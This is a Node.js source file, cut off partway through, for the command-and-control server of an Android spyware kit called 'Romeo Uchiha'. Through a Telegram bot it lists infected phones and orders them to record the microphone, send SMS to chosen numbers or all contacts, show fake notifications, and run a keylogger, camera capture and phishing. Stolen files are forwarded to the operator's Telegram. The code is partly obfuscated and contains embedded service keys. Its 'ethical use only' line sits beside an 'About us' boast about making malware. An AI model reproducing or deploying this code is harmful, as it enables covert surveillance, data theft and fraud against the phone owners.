const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
  'polling': true,
  'request': {}
});

// 3. Supabase Integration
const supabaseUrl = process.env.SUPABASE_URL || 'https://nebwfonyhfgxnfkiisvs.supabase.co';
const supabaseKey = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58';
const supabase = createClient(supabaseUrl, supabaseKey);

const appData = new Map();
const loggedInUsers = new Map(); // Store authenticated sessions

// 4. Web Interface (index.html) & Auth
app.use(express.json());
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Romeo Uchiha Web Interface</title>
        <style>body{background:#000;color:#f00;font-family:monospace;text-align:center;padding:50px;}</style>
    </head>
    <body>
        <h1>👁️‍🗨️ <b>Romeo Uchiha</b> Dashboard</h1>
        <p style="color:#ffcc00;font-weight:bold;">Ethical use only. This tool is made for testing and ethical use, and you are responsible for your actions.</p>
        <div id="authBox">
            <input id="uid" placeholder="Telegram UID"><br><br>
            <input id="pass" type="password" placeholder="Password"><br><br>
            <button onclick="authUser('login')"><b>Login</b></button>
            <button onclick="authUser('register')"><b>Register</b></button>
        </div>
        <div id="panelBox" style="display:none;">
            <h2>Welcome, <b>Romeo Uchiha</b></h2>
            <p>Your Secure URL:</p>
            <a id="urlLink" style="color:#0f0;" href="#"></a>
            <br><br><button onclick="genUrl()" id="genBtn" style="display:none;"><b>Generate URL</b></button>
        </div>
        <script>
            async function authUser(type) {
                const u = document.getElementById('uid').value;
                const p = document.getElementById('pass').value;
                const res = await fetch('/auth', { method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({type, uid: u, pass: p}) });
                const d = await res.json();
                if(d.success) {
                    document.getElementById('authBox').style.display='none';
                    document.getElementById('panelBox').style.display='block';
                    if(d.url) { document.getElementById('urlLink').innerText = d.url; document.getElementById('urlLink').href = d.url; }
                    else { document.getElementById('genBtn').style.display='block'; window.userUid = u; }
                } else alert('Authentication Failed');
            }
            async function genUrl() {
                const res = await fetch('/generate', { method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({uid: window.userUid}) });
                const d = await res.json();
                if(d.url) { document.getElementById('urlLink').innerText = d.url; document.getElementById('urlLink').href = d.url; document.getElementById('genBtn').style.display='none'; }
            }
        </script>
    </body>
    </html>
  `);
});

app.post("/auth", async (req, res) => {
    const { type, uid, pass } = req.body;
    if(type === 'register') {
        await supabase.from('rm-d').insert([{ uid, password: pass }]);
        res.json({ success: true });
    } else {
        const { data: user } = await supabase.from('rm-d').select('*').eq('uid', uid).eq('password', pass).single();
        res.json({ success: !!user, url: user ? user.generated_url : null });
    }
});

app.post("/generate", async (req, res) => {
    const { uid } = req.body;
    const url = `https://doge-production-517d.up.railway.app/${uid}`;
    await supabase.from('rm-d').update({ generated_url: url }).eq('uid', uid);
    res.json({ url });
});

// 1. Text & Formatting Changes (Replaced ✯ with 👁️‍🗨️, bolded function names)
const actions = ["👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"];

// 5. Data Routing & Privacy (Using /:uid for isolation)
app.post("/:uid/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
  const targetUid = _0xe7d0f6.params.uid;
  const _0x1763f6 = _0xe7d0f6.file.originalname.replace(".txt", ""); 
  const _0x3abcf4 = _0xe7d0f6.headers.model;
  bot.sendDocument(targetUid, _0xe7d0f6.file.buffer, {
    'caption': "<b>👁️‍🗨️ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x3abcf4 + '</b>\nUploaded to: <b>Romeo Uchiha</b>',
    'parse_mode': "HTML"
  }, {
    'filename': _0x1763f6,
    'contentType': "*/*"
  });
  _0x30973d.send("Done");
});

app.get("/:uid/text", (_0x5b9a91, _0x340799) => {
  _0x340799.send(data.text);
});

io.on("connection", _0x48afef => {
  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let _0x3e1fde = _0x48afef.handshake.headers.version || "no information";
  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "no information";
  
  // Privacy routing via URL path or query params mapped to targetUid
  let targetUid = _0x48afef.handshake.query.uid || data.id;

  _0x48afef.model = _0x35d854;
  _0x48afef.version = _0x3e1fde;
  let _0x5ede9b = "<b>👁️‍🗨️ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x35d854 + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3e1fde + "\n") + ("<b>𝚒𝚙</b> → " + _0x4c49f4 + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x48afef.handshake.time + "\n\n");
  bot.sendMessage(targetUid, _0x5ede9b, {
    'parse_mode': "HTML"
  });

  _0x48afef.on("disconnect", () => {
    let _0x4c86f2 = "<b>👁️‍🗨️ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x35d854 + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3e1fde + "\n") + ("<b>𝚒𝚙</b> → " + _0x4c49f4 + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x48afef.handshake.time + "\n\n");
    bot.sendMessage(targetUid, _0x4c86f2, {
      'parse_mode': "HTML"
    });
  });

  _0x48afef.on("message", async _0x44fcc5 => {
    // 2. Telegram Bot UI & Animations
    let msgText = "<b>👁️‍🗨️ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x35d854 + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" + _0x44fcc5;
    let sentMsg = await bot.sendMessage(targetUid, msgText, { 'parse_mode': "HTML" });

    if (_0x44fcc5.includes("The device has started uploading the file, please be patient")) {
        let pBar = ["🔴⚪⚪⚪⚪⚪⚪⚪⚪⚪", "🔴🔴⚪⚪⚪⚪⚪⚪⚪⚪", "🔴🔴🔴🔴⚪⚪⚪⚪⚪⚪", "🔴🔴🔴🔴🔴🔴⚪⚪⚪⚪", "🔴🔴🔴🔴🔴🔴🔴🔴⚪⚪", "🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴"];
        for (let i = 0; i < pBar.length; i++) {
            await new Promise(r => setTimeout(r, 600));
            bot.editMessageText(msgText + "\n\n<b>Uploading:</b> [" + pBar[i] + "]", { chat_id: targetUid, message_id: sentMsg.message_id, parse_mode: "HTML" });
        }
    }
  });
});

bot.on("message", async _0xdbde0c => {
  const chatId = _0xdbde0c.chat.id;

  // 6. Telegram Bot Authentication
  if (_0xdbde0c.text && _0xdbde0c.text.startsWith("/lg ")) {
    const match = _0xdbde0c.text.match(/\/lg (.+)@(.+)/);
    if (match) {
        const uid = match[1];
        const pass = match[2];
        const { data: user } = await supabase.from('rm-d').select('*').eq('uid', uid).eq('password', pass).single();
        if (user) {
            loggedInUsers.set(chatId, uid);
            return bot.sendMessage(chatId, "<b>👁️‍🗨️ Login Successful, <b>Romeo Uchiha</b>!</b>", { parse_mode: "HTML" });
        }
    }
    return bot.sendMessage(chatId, "<b>🔴 Login Failed! Invalid Format or Credentials. Use: /lg uid@password</b>", { parse_mode: "HTML" });
  }

  if (!loggedInUsers.has(chatId) && _0xdbde0c.text !== "/start") {
    return bot.sendMessage(chatId, "<b>🔴 Please login first using: /lg uid@password</b>", { parse_mode: "HTML" });
  }

  if (_0xdbde0c.text === "/start") {
    // 7. Mandatory Disclaimer
    bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 <b>Romeo Uchiha</b> BOT</b>\nEthical use only. This tool is made for testing and ethical use, and you are responsible for your actions.\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: <b>Romeo Uchiha</b>", {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
        'resize_keyboard': true
      }
    });
  } else {
    if (appData.get("currentAction") === "microphoneDuration") {
      let _0x3376c5 = _0xdbde0c.text;
      let _0x44b92e = appData.get('currentTarget');
      if (_0x44b92e == "all") {
        io.sockets.emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      } else {
        io.to(_0x44b92e).emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      }
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
      bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get("currentAction") === "toastText") {
        let _0x3f8601 = _0xdbde0c.text;
        let _0x5c0cc9 = appData.get('currentTarget');
        if (_0x5c0cc9 == "all") {
          io.sockets.emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': _0x3f8601
            }]
          });
        } else {
          io.to(_0x5c0cc9).emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': _0x3f8601
            }]
          });
        }
        appData["delete"]("currentTarget");
        appData["delete"]("currentAction");
        bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
            'resize_keyboard': true
          }
        });
      } else {
        if (appData.get("currentAction") === "smsNumber") {
          let _0x16b4e5 = _0xdbde0c.text;
          appData.set("currentNumber", _0x16b4e5);
          appData.set("currentAction", 'smsText');
          bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + _0x16b4e5 + "</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
              'resize_keyboard': true,
              'one_time_keyboard': true
            }
          });
        } else {
          if (appData.get("currentAction") === "smsText") {
            let _0x6d597e = _0xdbde0c.text;
            let _0x1c124a = appData.get("currentNumber");
            let _0x49a537 = appData.get("currentTarget");
            if (_0x49a537 == "all") {
              io.sockets.emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': _0x1c124a
                }, {
                  'key': "text",
                  'value': _0x6d597e
                }]
              });
            } else {
              io.to(_0x49a537).emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': _0x1c124a
                }, {
                  'key': "text",
                  'value': _0x6d597e
                }]
              });
            }
            appData["delete"]('currentTarget');
            appData["delete"]("currentAction");
            appData["delete"]("currentNumber");
            bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get("currentAction") === "vibrateDuration") {
              let _0x26f07c = _0xdbde0c.text;
              let _0x3275f8 = appData.get("currentTarget");
              if (_0x3275f8 == "all") {
                io.sockets.emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': _0x26f07c
                  }]
                });
              } else {
                io.to(_0x3275f8).emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': _0x26f07c
                  }]
                });
              }
              appData["delete"]("currentTarget");
              appData["delete"]("currentAction");
              bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get("currentAction") === "textToAllContacts") {
                let _0x535777 = _0xdbde0c.text;
                let _0x3b22c4 = appData.get("currentTarget");
                if (_0x3b22c4 == "all") {
                  io.sockets.emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': _0x535777
                    }]
                  });
                } else {
                  io.to(_0x3b22c4).emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': _0x535777
                    }]
                  });
                }
                appData["delete"]("currentTarget");
                appData["delete"]("currentAction");
                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                    'resize_keyboard': true
                  }
                });
              } else {
                if (appData.get("currentAction") === "notificationText") {
                  let _0x371a40 = _0xdbde0c.text;
                  appData.set("currentNotificationText", _0x371a40);
                  if (target == "all") {
                    io.sockets.emit("commend", {
                      'request': "popNotification",
                      'extras': [{
                        'key': "text",
                        'value': _0x371a40
                      }]
                    });
                  } else {
                    io.to(target).emit("commend", {
                      'request': 'popNotification',
                      'extras': [{
                        'key': "text",
                        'value': _0x371a40
                      }, {
                        'key': "url",
                        'value': url
                      }]
                    });
                  }
                  appData["delete"]('currentTarget');
                  appData["delete"]("currentAction");
                  appData["delete"]("currentNotificationText");
                  bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                    'parse_mode': "HTML",
                    'reply_markup': {
                      'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                      'resize_keyboard': true
                    }
                  });
                } else {
                  if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️") {
                    if (io.sockets.sockets.size === 0x0) {
                      bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                        'parse_mode': "HTML"
                      });
                    } else {
                      let _0x1e2656 = "<b>👁️‍🗨️ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : " + io.sockets.sockets.size + "</b>\n\n";
                      let _0x518a8a = 0x1;
                      io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
                        _0x1e2656 += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + _0x518a8a + "</b>\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x3479dd.model + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3479dd.version + "\n") + ("<b>𝚒𝚙</b> → " + _0x3479dd.ip + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x3479dd.handshake.time + "\n\n");
                        _0x518a8a += 0x1;
                      });
                      bot.sendMessage(chatId, _0x1e2656, {
                        'parse_mode': "HTML"
                      });
                    }
                  } else {
                    if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️") {
                      if (io.sockets.sockets.size === 0x0) {
                        bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
                        let _0x307c8a = [];
                        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
                          _0x307c8a.push([_0x6307e5.model]);
                        });
                        _0x307c8a.push(["👁️‍🗨️ <b>𝙰𝚕𝚕</b> 👁️‍🗨️"]);
                        _0x307c8a.push(["👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"]);
                        bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
                          'parse_mode': 'HTML',
                          'reply_markup': {
                            'keyboard': _0x307c8a,
                            'resize_keyboard': true,
                            'one_time_keyboard': true
                          }
                        });
                      }
                    } else {
                      if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️") {
                        bot.sendMessage(chatId, "<b>👁️‍🗨️ If you want to hire us for any paid work please contact <b>Romeo Uchiha</b>\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → <b>Romeo Uchiha</b>\nADMIN → <b>Romeo Uchiha</b></b>\n\n", {
                          'parse_mode': 'HTML'
                        });
                      } else {
                        if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️") {
                          bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                            'parse_mode': "HTML",
                            'reply_markup': {
                              'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                              'resize_keyboard': true
                            }
                          });
                        } else {
                          if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️") {
                            let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
                            if (_0x3202e5 == "all") {
                              bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
